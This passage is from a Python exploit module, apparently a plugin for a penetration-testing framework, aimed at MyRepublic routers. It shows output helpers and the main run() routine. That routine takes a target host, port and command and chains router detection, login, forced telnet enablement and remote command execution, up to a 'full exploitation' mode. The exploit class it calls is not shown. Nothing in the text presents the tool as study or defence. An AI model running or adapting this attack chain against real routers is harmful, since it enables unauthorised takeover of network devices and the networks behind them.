    table.add_column("Value", style="green")
    table.add_column("Req", style="yellow")
    table.add_column("Desc", style="white")
    for k, v in opts.items():
        val = v.get('value', v.get('default', ''))
        req = "yes" if v.get('required') else "no"
        table.add_row(k, str(val), req, v.get('description', ''))
    console.print(Panel(table, border_style="blue"))

def show_output(text):
    if text and text.strip():
        syntax = Syntax(text.strip(), "bash", theme="monokai", line_numbers=True)
        console.print(Panel(syntax, title="Command Output", border_style="green"))

# ===================================================================
# MAIN EXECUTION
# ===================================================================
def run(session, options):
    show_info()
    current = {k: {**v, 'value': options.get(k, v.get('default'))} for k, v in OPTIONS.items()}
    show_options(current)

    rhost = options.get("RHOST", "192.168.1.1")
    rport = options.get("RPORT", "80")
    proto = options.get("PROTO", "http")
    mode = options.get("MODE", "detect").lower()
    cmd = options.get("CMD", "id")
    telnet_port = int(options.get("TELNET_PORT", "23"))

    console.print(f"\n[bold yellow]🎯 Target: {proto}://{rhost}:{rport}[/bold yellow]")
    console.print(f"[bold yellow]🔧 Mode: {mode.upper()}[/bold yellow]")

    try:
        exploit = MyRepublicExploit(rhost, rport, proto, cmd=cmd, telnet_port=telnet_port)

        # Step 0: Test connectivity first
        if not exploit.test_connectivity():
            console.print("[red]❌ Target not reachable[/red]")
            return False

        # Step 1: Device Detection
        if not exploit.detect_device():
            console.print("[red]❌ Target not a supported router[/red]")
            return False

        # Step 2: Mode Execution
        if mode == "detect":
            console.print("\n[bold green]✅ Detection completed[/bold green]")
            return True
            
        elif mode == "login":
            if exploit.try_login():
                console.print("\n[bold green]✅ Login successful[/bold green]")
                return True
            else:
                console.print("\n[bold red]❌ Login failed[/bold red]")
                return False
                
        elif mode == "telnet":
            console.print("\n[bold yellow]=== TELNET EXPLOITATION ===[/bold yellow]")
            if exploit.try_login():
                exploit.enable_telnet()
                if exploit.connect_telnet():
                    console.print("\n[bold green]✅ Telnet exploitation successful[/bold green]")
                    return True
                else:
                    console.print("\n[bold red]❌ Telnet failed[/bold red]")
                    return False
            else:
                console.print("[red]❌ Login required for telnet[/red]")
                return False
                
        elif mode == "rce":
            console.print("\n[bold yellow]=== RCE EXPLOITATION ===[/bold yellow]")
            if exploit.try_login():
                if exploit.exploit_rce():
                    console.print("\n[bold green]✅ RCE exploitation successful[/bold green]")
                    return True
                else:
                    console.print("\n[bold red]❌ RCE failed[/bold red]")
                    return False
            else:
                console.print("[red]❌ Login required for RCE[/red]")
                return False
                
        elif mode == "full":
            console.print("\n[bold yellow]=== FULL EXPLOITATION ===[/bold yellow]")
            
            # Step 1: Login
            console.print("[cyan][*] Step 1: Authentication[/cyan]")
            if exploit.try_login():
                console.print("[green]✅ Login successful[/green]")
                
                # Step 2: Telnet
                console.print("[cyan][*] Step 2: Telnet Access[/cyan]")
                exploit.enable_telnet()
                telnet_success = exploit.connect_telnet()
                
                # Step 3: RCE
                console.print("[cyan][*] Step 3: Remote Code Execution[/cyan]")
                rce_success = exploit.exploit_rce()
                
                if telnet_success or rce_success:
                    console.print(Panel(
                        "[bold green]🎉 FULL EXPLOITATION COMPLETED SUCCESSFULLY![/bold green]",
                        border_style="green"
                    ))
                    return True
                else:
                    console.print(Panel(
                        "[yellow]⚠️  PARTIAL SUCCESS[/yellow]\n"
                        "• Telnet: Failed\n"
                        "• RCE: Failed\n"
                        "Router may be patched or requires different approach",
                        border_style="yellow"
                    ))
                    return False
            else:
                console.print("[red]❌ Login failed - stopping exploitation[/red]")
                return False

        console.print(f"\n[bold green]✅ {mode.upper()} mode completed![/bold green]")
        return True

    except Exception as e:
        console.print(f"[bold red]❌ Error: {str(e)}[/bold red]")
        return False
